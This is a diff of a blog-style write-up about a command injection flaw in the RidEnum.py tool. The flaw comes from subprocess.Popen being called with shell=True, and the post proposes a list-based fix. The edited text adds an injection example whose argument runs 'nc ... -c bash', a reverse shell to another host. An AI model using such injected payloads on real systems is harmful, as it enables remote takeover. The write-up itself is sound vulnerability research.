@@ -12,7 +12,7 @@ Reading source code from other individuals or groups can give you an insight int
   * What the drug or alcohol choice of the individual/group was during development ;)
   
 ## Some Of Python's Dangerous Functions & Methods
-In my opinion, Python is a fantastic language. It's one of my favorites along side with PowerShell, and C#. However, like all computer languages it doesn't come without it's flaws or dangerous functions and methods. You can read more about some of those dangerous functions and methods in the below links:
+Python is a fantastic language. It's one of my favorites along side PowerShell, and C#. However, like all computer languages it doesn't come without it's flaws or dangerous functions and methods. You can read more about some of those dangerous functions and methods in the below links:
  1. https://www.kevinlondon.com/2015/07/26/dangerous-python-functions.html
  2. https://www.kevinlondon.com/2015/08/15/dangerous-python-functions-pt2.html
  3. https://security.openstack.org/guidelines/dg_use-subprocess-securely.html
@@ -20,8 +20,10 @@ In my opinion, Python is a fantastic language. It's one of my favorites along si
  5. https://medium.com/python-pandemonium/a-trap-of-shell-true-in-the-subprocess-module-6db7fc66cdfd
  6. https://docs.python.org/3.7/library/subprocess.html#popen-objects
  
+The links above focus more on which a user is prompted to provide input via the `input` function in Python. Leveraging command injection via command line arguments that will be parsed by a script will be a little trickier, but it's still very simple to do.
+ 
 ## The Vulnerability
-The vulnerability itself is not super-duper serious as a vast majority of Linux machines will probably not have this tool installed. While working on a CTF problem involving SIDs and looking for another tool to compare with Impacket's lookupsid.py script, I came across a tool written by Dave Kennedy (ReL1K) called RidEnum.py. I was interested in how both tools were obtaining the Domain SID, but that's not really important. However, I noticed in the source code on the [github page](https://github.com/trustedsec/ridenum/blob/master/ridenum.py) that the tool was using a Subprocess.Popen object to execute a shell command. This appears on lines 62 and 78. 
+The vulnerability itself is not super-duper serious as a vast majority of Linux machines will probably not have this tool installed. While working on a CTF problem involving SIDs and looking for another tool to compare with Impacket's lookupsid.py script, I came across a tool written by Dave Kennedy (ReL1K) called RidEnum.py. I was interested in how both tools were obtaining the Domain SID, but that's not really important. However, I noticed in the source code on the [github page](https://github.com/trustedsec/ridenum/blob/master/ridenum.py) that the tool was using a Subprocess.Popen object or two to execute a shell command. This appears on lines 62 and 78. 
 
 There are two arguments that helped me to perform command injection. If you look closely, you'll note that the variable `command` which will store the string representation of the command to be executed takes the `auth` (or optional username argument) and the IP argument and then places them into the string using the "old style" string formatting operator (`%`).
 
@@ -29,7 +31,7 @@ Two things can be taken in to consideration at this point (links 3, 4 and 5 abov
 
 1. The `shell` parameter in both calls are set to `true`. That's a no no, especially if you allow a user to supply input to your script or program. In simple terms, this tells Python to execute the string containing the command(s) as if you were doing it in a bash shell.
 
-2. The `command` variable is a whole string variable that contains the entirety of a bash command, so everything is treated literally so to speak. Rather the string referenced by the `command` variable should have been broken down into a list of strings (`command = ["rpcclient", "-U", "\"{}\"".format(auth), "{}".format(ip) "-c", "\"lsaquery\""]`)
+2. The `command` variable is a whole *string* variable that contains the entirety of a bash command, so everything is treated literally so to speak. Rather the string referenced by the `command` variable should have been broken down into a list of strings (`command = ["rpcclient", "-U", "\"{}\"".format(auth), "{}".format(ip) "-c", "\"lsaquery\""]`)
 
 
 Here's the help documentation for ridenum.
@@ -38,10 +40,11 @@ Example: ./ridenum.py 192.168.1.50 500 50000 /root/dict.txt /root/user.txt
 
 Usage: ./ridenum.py <server_ip> <start_rid> <end_rid> <optional_username> <optional_password> <optional_password_file> <optional_username_filename>
 ```
-Let's execute ridenum and inject the bash command `id`.
+As I said before, doing this via command line arguments is a little tricker. One would expect that all they would have to do is excute the following command `./ridenum.py 10.10.10.10;id; 100 1000 0v3rride`. This doesn't work, because all you're doing is terminating the `ridenum.py` script prematurely without giving it all of the required arguments, calling the bash command `id` and then specifying abunch of crap after the fact that has no meaning in bash (`100 1000 0v3rride`). Take a look at point two again above and notice the keyword 'string'.
 
+Let's execute ridenum and inject the bash command `id`.
 ```
-./ridenum.py 10.10.10.10;id; 100 1000 0v3rride
+./ridenum.py "1.1.1.1; *nc 192.168.1.126 1234 -c bash;*" 0 3 "0v3rride" "mysecretpassword"
 ```
 
 Result (I'm executing this on my Kali machine locally, that's why I'm root):
